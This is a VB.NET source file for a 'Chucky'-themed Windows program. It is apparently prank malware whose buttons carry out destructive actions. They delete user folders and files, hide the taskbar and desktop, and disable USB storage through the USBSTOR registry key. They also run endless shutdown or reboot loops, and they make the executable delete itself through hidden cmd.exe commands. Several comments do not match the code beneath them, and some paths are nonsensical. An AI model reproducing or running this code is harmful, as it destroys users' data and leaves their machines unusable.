Imports System.IO
Imports System.Diagnostics
Imports Microsoft.Win32

Public Class NextStep
    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Int32

    Const SWP_HIDEWINDOW = &H80
    Const SWP_SHOWWINDOW = &H40
    Private Const SW_HIDE As Int32 = 0
    Private Const SW_RESTORE As Int32 = 9
    Dim taskBar As Integer


    Private Sub NextStep_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        taskBar = FindWindow("Shell_traywnd", "")
        Dim Ans As Integer
        Ans = MsgBox("WELL, I'M IMPRESSED. LET'S SEE IF YOU PASS THE NEXT STEP", 0, "CHUCKY")
        If Ans = 1 Then
            My.Computer.Audio.Play(My.Resources.chuckys_laugh_3, AudioPlayMode.Background)
        End If

    End Sub

    'This little piece of code spawns the Command prompt and executes the command to delete the currently running EXE file; then, it exits the application.
    'This works, but the only problem is that it displays the Command Prompt window whilst deleting the file.
    'To circumvent this, edit the preceding code to look like the following.
    'Self-Destruct Although this is pretty useful when it comes to uninstalling and reinstalling applications, it is tricky territory.
    'Windows is designed to not delete files that are running; circumventing this feature may open unwanted doors.
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim piDestruct As ProcessStartInfo = New ProcessStartInfo()

        piDestruct.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " _    'Self-Destructs Program///
         & Application.ExecutablePath
        piDestruct.WindowStyle = ProcessWindowStyle.Hidden
        piDestruct.CreateNoWindow = True
        piDestruct.FileName = "cmd.exe"

        Process.Start(piDestruct)
    End Sub

    'Same as above, but deletes 5 days from the time its ran///

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        My.Computer.FileSystem.DeleteDirectory("C:\$WINDOWS.~BT\Sources\dlmanifests", FileIO.DeleteDirectoryOption.DeleteAllContents)
        Process.Start("C:\WINDOWS\system32\rundll32.exe", "user32.dll,LockWorkStation")
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\YOURPATH" 'DELETE WHATEVER YOU WANT HERE///
        System.IO.Directory.Delete(path, True)
        System.IO.Directory.Delete(path, True)
        Dim directory As New IO.DirectoryInfo("C:\YourDirectory") 'Your Path/Directory

        Cursor.Hide() 'Hides Cursor///

        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".txt") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The Days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".exe") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
    End Sub



    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click 'Screen loop rotation>>>Haven't tried it, but in theory, it should work///
        My.Computer.Audio.Play(My.Resources.chuckys_laugh_3, AudioPlayMode.Background)
        Doom.Show()
        Button1.Text = "Hide"
        Debug.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, SWP_HIDEWINDOW))
        Button1.Text = "Show"
        Me.Hide()
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click ''Hides TaskBar & Start Button///
        Dim hwnd As IntPtr
        hwnd = FindWindow(vbNullString, "Program Manager")
        If Not hwnd = 0 Then
            ShowWindow(hwnd, SW_HIDE)
        End If
    End Sub



    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click ''Shows TaskBar & Start Button///
        Do
            Shell("shutdown -l")
            Dim regKey As RegistryKey
            regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
            regKey.SetValue("Start", 4)
        Loop
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Do
            Shell("shutdown -r")
            Dim regKey As RegistryKey
            regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
            regKey.SetValue("Start", 4)
        Loop
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click

        Shell("shutdown -s -t 6000")
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
        regKey.SetValue("Start", 4)
        Process.Start("C:\WINDOWS\system32\rundll32.exe", "user32.dll,LockWorkStation")

    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Dim eachFileInMydirectory As New DirectoryInfo("C:\Windows\Boot\PCAT\bootuwf.dll")
        Dim fileName As IO.FileInfo

        For Each fileName In eachFileInMydirectory.GetFiles
            If fileName.Extension.Equals(".txt") AndAlso (Now - fileName.CreationTime).Days > 8 Then
                Dim fullPath As String = Path.Combine("C:\Windows\Boot\PCAT\bootuwf.dll", fileName.ToString)
                File.Delete(fullPath)
            End If
        Next

    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Dim Info As ProcessStartInfo = New ProcessStartInfo()
        Info.Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del """ & Application.ExecutablePath.ToString & """"
        Info.WindowStyle = ProcessWindowStyle.Hidden
        Info.CreateNoWindow = True
        Info.FileName = "cmd.exe"
        Process.Start(Info)
    End Sub
End Class